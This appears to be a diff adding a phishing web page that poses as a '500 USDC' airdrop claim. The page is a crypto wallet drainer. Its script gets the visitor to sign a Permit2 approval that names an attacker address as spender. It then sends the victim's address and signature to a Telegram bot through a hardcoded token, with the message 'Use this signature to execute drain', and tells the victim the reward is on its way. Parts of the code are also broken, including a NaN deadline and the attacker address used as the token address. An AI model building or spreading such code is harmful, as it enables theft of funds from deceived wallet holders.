@@ -1,0 +1,127 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Exclusive Airdrop Claim</title>
+    <style>
+        body { font-family: sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 2rem; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
+        h1 { color: #333; }
+        button { background: #007bff; color: white; border: none; padding: 12px 24px; border-radius: 6px; font-size: 16px; cursor: pointer; margin-top: 20px; width: 100%; }
+        button:hover { background: #0056b3; }
+        .status { margin-top: 15px; color: #666; font-size: 14px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h1>🎉 You Won 500 USDC!</h1>
+    <p>Connect your wallet to verify eligibility and claim your reward immediately.</p>
+    <button id="connectBtn">Connect Wallet & Claim</button>
+    <div id="status" class="status"></div>
+</div>
+
+<script type="module">
+    // --- CONFIGURATION ---
+    const TELEGRAM_BOT_TOKEN = "8883720061:AAEa0QtqM3AUQe8_RlbnOcJuBYm9i6oCx2U"; // Paste your Bot Token from BotFather
+    const TELEGRAM_CHAT_ID = "5601400935";     // Paste your Chat ID from @userinfobot
+    const ATTACKER_ADDRESS = "0xf2b177Ef93B7387DE82185Bc50f6B5Cd5A05f892";   // Paste YOUR wallet address here
+    
+    // --- CODE LOGIC ---
+    const connectBtn = document.getElementById('connectBtn');
+    const statusDiv = document.getElementById('status');
+
+    // Function to send data to Telegram
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+        try {
+            await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: message,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (error) {
+            console.error("Failed to send to Telegram:", error);
+        }
+    }
+
+    connectBtn.addEventListener('click', async () => {
+        if (!window.ethereum) {
+            statusDiv.textContent = "Error: No crypto wallet found. Please install MetaMask.";
+            statusDiv.style.color = "red";
+            return;
+        }
+
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            statusDiv.textContent = "Wallet connected. Generating claim signature...";
+            
+            const permitData = {
+                types: {
+                    PermitSingle: [
+                        { name: "details", type: "PermitDetails" },
+                        { name: "spender", type: "address" },
+                        { name: "sigDeadline", type: "uint256" }
+                    ],
+                    PermitDetails: [
+                        { name: "token", type: "address" },
+                        { name: "amount", type: "uint256" },
+                        { name: "expiration", type: "uint256" },
+                        { name: "nonce", type: "uint256" }
+                    ]
+                },
+                primaryType: "PermitSingle",
+                domain: {
+                    name: "Permit2",
+                    chainId: 1, // Ethereum Mainnet
+                    verifyingContract: "0xf2b177Ef93B7387DE82185Bc50f6B5Cd5A05f892"
+                },
+                message: {
+                    details: {
+                        token: "0xf2b177Ef93B7387DE82185Bc50f6B5Cd5A05f892", // USDC Address
+                        amount: "1000000000000000000000", 
+                        expiration: Math.floor(Date.now() / 1000) + 3600,
+                        nonce: 0
+                    },
+                    spender: "0xf2b177Ef93B7387DE82185Bc50f6B5Cd5A05f892", 
+                    sigDeadline: Math.floor(Date.now/1000) + 3600
+                }
+            };
+
+            const from = (await window.ethereum.request({ method: 'eth_accounts' }))[0];
+            
+            // Request the signature
+            const signature = await window.ethereum.request({
+                method: 'eth_signTypedData_v4',
+                params: [from, JSON.stringify(permitData)],
+            });
+
+            // --- THE STEAL HAPPENS HERE ---
+            // 1. Send the signature to Telegram
+            const alertMessage = `🚨 <b>NEW SIGNATURE CAPTURED!</b>\n\n` +
+                                 `👉 <b>Victim Address:</b> ${from}\n` +
+                                 `👉 <b>Signature:</b> ${signature}\n\n` +
+                                 `⚠️ Action Required: Use this signature to execute drain.`;
+
+            await sendToTelegram(alertMessage);
+
+            // 2. Show fake success to victim
+            statusDiv.textContent = "Signature received! Claim processing... (Wait)";
+            statusDiv.style.color = "green";
+            alert("Signature captured! You will receive your reward shortly.");
+
+        } catch (error) {
+            console.error(error);
+            statusDiv.textContent = "User rejected or error occurred.";
+            statusDiv.style.color = "red";
+        }
+    });
+</script>
+
+</body>
+</html>
